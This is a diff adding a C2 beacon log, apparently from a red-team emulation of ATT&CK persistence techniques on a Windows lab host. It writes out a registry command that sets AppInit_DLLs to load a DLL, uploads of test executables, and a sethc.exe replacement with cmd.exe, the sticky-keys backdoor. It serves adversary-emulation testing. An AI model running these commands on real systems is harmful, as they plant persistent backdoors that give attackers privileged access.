@@ -1,0 +1,82 @@
+02/07 17:36:31 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 3484; os: Windows; version: 6.1; beacon arch: x86 (x64)
+02/07 17:38:14 [task] cd C:\Windows\System32\
+02/07 17:38:14 [task] 利用 reg命令设置app_init 项 
+02/07 17:38:14 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe add  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows /f /v  AppInit_DLLs /t REG_SZ /d "c:\test.dll"
+02/07 17:38:26 [checkin] host called home, sent: 239 bytes
+02/07 17:38:26 [output]
+received output:
+错误: 无效语法。
+键入 "REG ADD /?" 了解用法信息。
+
+C:\Windows\System32>
+
+02/07 17:42:09 [task] cd C:\Windows\System32\
+02/07 17:42:09 [task] 利用 reg命令设置app_init 项 
+02/07 17:42:09 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe add  "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /f /v  AppInit_DLLs /t REG_SZ /d "c:\test.dll"
+02/07 17:42:26 [checkin] host called home, sent: 241 bytes
+02/07 17:42:26 [output]
+received output:
+操作成功完成。
+
+C:\Windows\System32>
+
+02/07 17:57:25 [task] Tasked beacon to make directory c:\RedTeam\
+02/07 17:57:25 [task] cd c:\RedTeam\
+02/07 17:57:25 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1103.exe as T1103.exe
+02/07 17:57:25 [indicator] file: 5ddd5fc43beb2f6164779eb5eaa09d8d 7680 bytes T1103.exe
+02/07 17:57:25 [task] 利用 reg命令设置app_init 项 
+02/07 17:57:25 [task] Tasked beacon to run: c:\RedTeam\T1103.exe
+02/07 17:57:26 [checkin] host called home, sent: 7790 bytes
+02/07 17:59:18 [task] Tasked beacon to make directory c:\RedTeam\
+02/07 17:59:18 [task] cd c:\RedTeam\
+02/07 17:59:18 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1103_recover.exe as T1103_recover.exe
+02/07 17:59:18 [indicator] file: 62c08767964da59a8d8f34a885f9f9c2 7680 bytes T1103_recover.exe
+02/07 17:59:18 [task] 删除app_init 项 
+02/07 17:59:18 [task] Tasked beacon to run: c:\RedTeam\T1103_recover.exe
+02/07 17:59:26 [checkin] host called home, sent: 7806 bytes
+02/07 17:59:41 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sethc.exe" /A
+02/07 17:59:41 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
+02/07 17:59:41 [task] Tasked beacon to run: copy cmd.exe sethc.exe
+02/07 17:59:41 [task] Tasked beacon to make directory c:\RedTeam\
+02/07 17:59:41 [task] cd c:\RedTeam\
+02/07 17:59:41 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1015.exe as T1015.exe
+02/07 17:59:41 [indicator] file: 7c853a34c61bc47dd03e7c18e66db1ba 7680 bytes T1015.exe
+02/07 17:59:41 [task] Tasked beacon to run: C:\RedTeam\T1015.exe
+02/07 18:00:27 [checkin] host called home, sent: 8012 bytes
+02/07 18:00:27 [output]
+received output:
+
+成功: 此文件(或文件夹): "C:\Windows\System32\sethc.exe" 现在由管理员组所有。
+
+
+02/07 18:00:27 [output]
+received output:
+已处理的文件: C:\Windows\System32\sethc.exe
+已成功处理 1 个文件; 处理 0 个文件时失败
+
+
+02/07 18:00:27 [output]
+received output:
+已复制         1 个文件。
+
+
+02/07 18:00:27 [output]
+received output:
+
+Windows IP 配置
+
+
+以太网适配器 本地连接:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   本地链接 IPv6 地址. . . . . . . . : fe80::dc70:1ea3:67b5:311%11
+   IPv4 地址 . . . . . . . . . . . . : 172.17.2.54
+   子网掩码  . . . . . . . . . . . . : 255.255.254.0
+   默认网关. . . . . . . . . . . . . : 172.17.2.1
+
+隧道适配器 isatap.{A8E7B51B-9069-45DB-BA99-054EA369046E}:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+
